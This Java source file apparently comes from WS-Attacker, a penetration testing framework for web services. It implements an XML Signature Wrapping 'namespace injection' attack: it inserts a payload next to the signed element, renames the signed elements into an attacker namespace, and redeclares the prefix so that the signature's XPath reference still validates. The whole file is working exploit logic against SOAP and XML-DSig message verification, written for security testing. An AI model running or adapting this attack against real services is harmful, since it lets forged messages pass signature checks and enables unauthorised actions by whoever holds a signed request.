/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework
 * Copyright (C) 2011 Christian Mainka
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
package wsattacker.plugin.signatureWrapping.xpath.weakness;

import java.util.List;

import javax.xml.crypto.dsig.CanonicalizationMethod;

import org.w3c.dom.Element;
import org.w3c.dom.Node;

import wsattacker.plugin.signatureWrapping.util.dom.DomUtilities;
import wsattacker.plugin.signatureWrapping.util.exception.InvalidWeaknessException;
import wsattacker.plugin.signatureWrapping.util.signature.NamespaceConstants;
import wsattacker.plugin.signatureWrapping.util.signature.XPathElement;
import wsattacker.plugin.signatureWrapping.xpath.interfaces.XPathWeakness;
import wsattacker.plugin.signatureWrapping.xpath.parts.Step;
import wsattacker.plugin.signatureWrapping.xpath.weakness.util.WeaknessLog;
import wsattacker.plugin.signatureWrapping.xpath.weakness.util.XPathWeaknessTools;

/**
 * NamespaceInection attack.
 */
public class XPathNamespaceInjectionWeakness implements XPathWeakness
{

  int          numberOfSubtrees;
  int          numberOfPossibleNamspacedeclarationPositions;
  Step         step;
  XPathElement ref;

  public XPathNamespaceInjectionWeakness(XPathElement ref,
                                         Step step,
                                         Element signedElement,
                                         Element payloadElement)
                                                                throws InvalidWeaknessException
  {
    this.step = step;
    this.ref = ref;

    if (step.getPreviousStep() == null) {
		throw new InvalidWeaknessException("Namespace injection does not work on first step");
	}

    if (step.getNextStep() == null) {
		throw new InvalidWeaknessException("Namespace injection does not work on last step");
	}

    String prefix = step.getAxisSpecifier().getNodeName().getPrefix();
    if (prefix.isEmpty()) {
		throw new InvalidWeaknessException("No Prefix in this Step");
	}

    if (prefix.equals(signedElement.getPrefix())) {
		throw new InvalidWeaknessException("Namespace injection technique requires the signed Element to have a different namespace than the injected one.");
	}

    // Detect if exclusive canonicalization method is used
    // only in this case the namespace injection attack works
    boolean exclusive = false;
    Node node = ref.getXPathElement();
    while (node.getNodeType() == Node.ELEMENT_NODE)
    {
      if (node.getLocalName().equals("SignedInfo") && node.getNamespaceURI().equals(NamespaceConstants.URI_NS_DS))
      {
        List<Element> canonList = DomUtilities
            .findChildren(node, "CanonicalizationMethod", NamespaceConstants.URI_NS_DS);
        for (Element canon : canonList)
        {
          if (CanonicalizationMethod.EXCLUSIVE.equals(canon.getAttribute("Algorithm")) || CanonicalizationMethod.EXCLUSIVE_WITH_COMMENTS
              .equals(canon.getAttribute("Algorithm")))
          {
            exclusive = true;
            break;
          }
        }
      }
      node = node.getParentNode();
    }
    if (!exclusive) {
		throw new InvalidWeaknessException("No exclusve c14n used!");
	}

    this.numberOfSubtrees = XPathWeaknessTools.getSignedPostPart(step, signedElement).size();

    numberOfPossibleNamspacedeclarationPositions = 0;
    node = ref.getXPathElement();
    while (node.getNodeType() == Node.ELEMENT_NODE)
    {
      ++numberOfPossibleNamspacedeclarationPositions;
      node = node.getParentNode();
    }

    if (getNumberOfPossibilites() == 0) {
		throw new InvalidWeaknessException("XPath does not match any Elements.");
	}
  }

  @Override
  public int getNumberOfPossibilites()
  {
    // 2 possibilites: before and after original Element
    return 2 * numberOfSubtrees * numberOfPossibleNamspacedeclarationPositions;
  }

  @Override
  public void abuseWeakness(int index,
                            Element signedElement,
                            Element payloadElement)
                                                   throws InvalidWeaknessException
  {
    boolean before = (index % 2) == 0;
    index /= 2;
    int elementIndex = index % numberOfSubtrees;
    index /= numberOfSubtrees;
    int declarationPosition = index % numberOfPossibleNamspacedeclarationPositions;

    abuseWeakness(before, elementIndex, declarationPosition, signedElement, payloadElement);
  }

  /**
   * Performs a namespace injection attack.
   * 
   * @param before
   *          : Should the payload be placed before or after the signed part?
   * @param elementIndex
   *          : Commonly, this is 0. Only if the XPath matches multiple Elements, this can be used.
   * @param declarationPosition
   *          : Where to declare the xmlns:orgPrefix=attacker-uri
   * @param signedElement
   * @param payloadElement
   * @throws InvalidWeaknessException
   */
  private void abuseWeakness(boolean before,
                             int elementIndex,
                             int declarationPosition,
                             Element signedElement,
                             Element payloadElement)
                                                    throws InvalidWeaknessException
  {
    List<Element> matches = XPathWeaknessTools.getSignedPostPart(step, signedElement);
    Element signedPostPart = matches.get(elementIndex);
    Element payloadPostPart = XPathWeaknessTools.createPayloadPostPart(signedPostPart, signedElement, payloadElement);

    if (before)
    {
      WeaknessLog.append("Inserted Payload just before " + signedPostPart.getNodeName());
      signedPostPart.getParentNode().insertBefore(payloadPostPart, signedPostPart);
    }
    else
    {
      WeaknessLog.append("Inserted Payload after " + signedPostPart.getNodeName());
      signedPostPart.getParentNode().appendChild(payloadPostPart);
    }

    String theNamespaceUri = signedPostPart.getNamespaceURI();
    String thePrefix = signedPostPart.getPrefix();

    String injectedPrefix = "atk" + thePrefix; // TODO: Use random prefix?
    String injectedNamespaceUri = NamespaceConstants.URI_NS_WSATTACKER;

    // change prefix namespace uri of signed post part and its descandants
    List<Element> taskList = DomUtilities.findChildren(signedPostPart, null, theNamespaceUri);
    taskList.add(0, signedPostPart);
    for (Element task : taskList)
    {
      if (task.getPrefix().equals(thePrefix) && task.getNamespaceURI().equals(theNamespaceUri))
      {
        task.getOwnerDocument().renameNode(task, injectedNamespaceUri, injectedPrefix + ":" + task.getLocalName());
        WeaknessLog.append(String.format("Renamed %s:%s to {%s}%s", thePrefix, task.getLocalName(), task
            .getNamespaceURI(), task.getNodeName()));
      }
    }

    // add new prefix so that xpath element can see it
    Element declarationElement = DomUtilities.findCorrespondingElement(signedElement.getOwnerDocument(), ref
        .getXPathElement());
    for (int i = 1; i < declarationPosition; ++i)
    {
      // go up
      System.out.println("Up: " + i);
      declarationElement = (Element) declarationElement.getParentNode();
    }
    declarationElement.setAttribute("xmlns:" + thePrefix, injectedNamespaceUri);
    WeaknessLog.append(String.format("Changed namespace declaration in <%s> to %s -> %s", declarationElement
        .getNodeName(), thePrefix, injectedNamespaceUri));

  }

}
